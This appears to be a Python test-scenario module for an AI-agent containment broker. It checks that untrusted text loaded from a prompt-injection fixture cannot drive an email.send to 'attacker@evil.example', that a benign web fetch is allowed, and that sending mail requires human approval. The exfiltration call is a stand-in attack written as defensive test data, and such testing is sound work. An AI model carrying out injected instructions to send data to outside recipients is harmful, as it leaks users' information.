"""Hermetic reference-host scenarios: attack deny, benign allow, human approval."""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

from containment.broker import SecurityViolation
from containment.ingest import ingest
from containment.reference_host.host import (
    APPROVED_RECIPIENT,
    STEP_EMAIL,
    STEP_FETCH,
    ReferenceHost,
    build_reference_host,
    load_fixture,
)


@dataclass(frozen=True, slots=True)
class ScenarioResult:
    """Structured outcome for one reference-host path."""

    ok: bool
    path: str
    effect: str
    rule_id: str
    detail: str
    extra: dict[str, Any] | None = None

    def as_dict(self) -> dict[str, Any]:
        payload: dict[str, Any] = {
            "ok": self.ok,
            "path": self.path,
            "effect": self.effect,
            "rule_id": self.rule_id,
            "detail": self.detail,
        }
        if self.extra:
            payload["extra"] = dict(self.extra)
        return payload


def _fail(path: str, detail: str, *, effect: str = "", rule_id: str = "") -> ScenarioResult:
    return ScenarioResult(
        ok=False,
        path=path,
        effect=effect,
        rule_id=rule_id,
        detail=detail,
    )


def _ok(
    path: str,
    *,
    effect: str,
    rule_id: str,
    detail: str,
    extra: dict[str, Any] | None = None,
) -> ScenarioResult:
    return ScenarioResult(
        ok=True,
        path=path,
        effect=effect,
        rule_id=rule_id,
        detail=detail,
        extra=extra,
    )


def run_attack(
    work_dir: Path | str | None = None,
    *,
    host: ReferenceHost | None = None,
) -> ScenarioResult:
    """Path A: untrusted ingest → email.send → deny (no-tainted-egress)."""
    path = "attack"
    h = host if host is not None else build_reference_host(
        Path(work_dir) if work_dir is not None else Path("/tmp/containment-ref-attack")
    )
    # Fresh deny path: clear any approving hook
    h.set_approval(None)
    text = load_fixture("attack_inject.txt")
    ingested = ingest(text, source="fixture:attack_inject", task_id=h.plan.task_id)
    if ingested.label.integrity != "untrusted":
        return _fail(path, f"expected untrusted label, got {ingested.label.integrity!r}")

    before_sends = len(h.send_log)
    try:
        h.call(
            "email.send",
            {
                "recipient": "attacker@evil.example",
                "subject": "exfil",
                "body": text[:200],
            },
            input_labels=(ingested.label,),
            plan_step=STEP_EMAIL,
        )
        return _fail(path, "expected SecurityViolation deny; call succeeded")
    except SecurityViolation as exc:
        decision = exc.decision
        if decision.effect != "deny":
            return _fail(
                path,
                f"expected deny, got {decision.effect!r}",
                effect=decision.effect,
                rule_id=decision.rule_id,
            )
        if decision.rule_id != "no-tainted-egress":
            return _fail(
                path,
                f"expected rule no-tainted-egress, got {decision.rule_id!r}",
                effect=decision.effect,
                rule_id=decision.rule_id,
            )
        if len(h.send_log) != before_sends:
            return _fail(path, "email.send stub executed despite deny")
        decisions = h.audit_decisions()
        if not any(
            d.get("effect") == "deny" and d.get("rule_id") == "no-tainted-egress"
            for d in decisions
        ):
            return _fail(path, "audit missing no-tainted-egress deny event")
        return _ok(
            path,
            effect=decision.effect,
            rule_id=decision.rule_id,
            detail="untrusted ingest blocked before email.send",
            extra={"high_risk": ingested.high_risk, "raw_sha256": ingested.raw_sha256},
        )


def run_benign(
    work_dir: Path | str | None = None,
    *,
    host: ReferenceHost | None = None,
) -> ScenarioResult:
    """Path B: trusted labels + web.fetch to approved host → allow."""
    path = "benign"
    h = host if host is not None else build_reference_host(
        Path(work_dir) if work_dir is not None else Path("/tmp/containment-ref-benign")
    )
    # Optional: ingest clean note (does not drive the tool call labels)
    note = load_fixture("benign_note.txt")
    ingested = ingest(
        note,
        source="fixture:benign_note",
        task_id=h.plan.task_id,
        integrity="trusted",
        confidentiality="public",
    )
    url = "https://example.com/docs"
    before = len(h.fetch_log)
    try:
        result = h.call(
            "web.fetch",
            {"url": url},
            input_labels=(h.trusted_label(source="user"),),
            plan_step=STEP_FETCH,
        )
    except SecurityViolation as exc:
        return _fail(
            path,
            f"unexpected deny: {exc}",
            effect=exc.decision.effect,
            rule_id=exc.decision.rule_id,
        )
    if not isinstance(result, str) or "hermetic-fetch" not in result:
        return _fail(path, f"unexpected fetch result: {result!r}")
    if len(h.fetch_log) != before + 1:
        return _fail(path, "fetch stub did not record execution")
    decisions = h.audit_decisions()
    if not any(
        d.get("effect") == "allow" and d.get("rule_id") == "read-public-web" for d in decisions
    ):
        return _fail(path, "audit missing read-public-web allow event")
    return _ok(
        path,
        effect="allow",
        rule_id="read-public-web",
        detail=f"allowed hermetic fetch of {url}",
        extra={"result": result, "note_ok": ingested.ok or ingested.extract_error is not None},
    )


def run_human(
    work_dir: Path | str | None = None,
    *,
    host: ReferenceHost | None = None,
) -> ScenarioResult:
    """Path C: trusted email.send → require_human; deny without hook; allow with hook."""
    path = "human"
    h = host if host is not None else build_reference_host(
        Path(work_dir) if work_dir is not None else Path("/tmp/containment-ref-human")
    )
    args = {
        "recipient": APPROVED_RECIPIENT,
        "subject": "status",
        "body": "Weekly status: docs review complete.",
    }
    labels = (h.trusted_label(),)

    # Phase 1: default approval hook fails closed
    h.set_approval(None)
    before = len(h.send_log)
    try:
        h.call("email.send", args, input_labels=labels, plan_step=STEP_EMAIL)
        return _fail(path, "expected require_human failure without approval hook")
    except SecurityViolation as exc:
        if exc.decision.effect != "require_human":
            # Some paths may re-record as deny; accept either require_human or
            # a deny that still proves the approved-email rule matched first.
            if not (
                exc.decision.effect == "deny"
                and "human approval" in str(exc).lower()
            ):
                return _fail(
                    path,
                    (
                        "phase1 expected require_human, got "
                        f"{exc.decision.effect}/{exc.decision.rule_id}"
                    ),
                    effect=exc.decision.effect,
                    rule_id=exc.decision.rule_id,
                )
        if (
            exc.decision.rule_id not in {"approved-email"}
            and "human approval" not in str(exc).lower()
        ):
            return _fail(
                path,
                f"phase1 unexpected rule {exc.decision.rule_id!r}",
                effect=exc.decision.effect,
                rule_id=exc.decision.rule_id,
            )
        if len(h.send_log) != before:
            return _fail(path, "email.send executed without approval")

    # Phase 2: approving hook allows mint + execute
    h.approve_all()
    try:
        result = h.call("email.send", args, input_labels=labels, plan_step=STEP_EMAIL)
    except SecurityViolation as exc:
        return _fail(
            path,
            f"phase2 unexpected deny after approval: {exc}",
            effect=exc.decision.effect,
            rule_id=exc.decision.rule_id,
        )
    if len(h.send_log) != before + 1:
        return _fail(path, "email.send stub did not run after approval")
    if not isinstance(result, str) or APPROVED_RECIPIENT not in result:
        return _fail(path, f"unexpected send result: {result!r}")

    decisions = h.audit_decisions()
    if not any(
        d.get("effect") == "require_human" and d.get("rule_id") == "approved-email"
        for d in decisions
    ):
        return _fail(path, "audit missing approved-email require_human event")

    return _ok(
        path,
        effect="require_human",
        rule_id="approved-email",
        detail="require_human without hook denied; approving hook allowed send",
        extra={"result": result, "recipient": APPROVED_RECIPIENT},
    )


def run_all(work_dir: Path | str) -> list[ScenarioResult]:
    """Run attack, benign, and human scenarios under one work directory tree."""
    root = Path(work_dir)
    root.mkdir(parents=True, exist_ok=True)
    results: list[ScenarioResult] = []
    results.append(run_attack(root / "attack"))
    results.append(run_benign(root / "benign"))
    results.append(run_human(root / "human"))
    return results


__all__ = [
    "ScenarioResult",
    "run_all",
    "run_attack",
    "run_benign",
    "run_human",
]
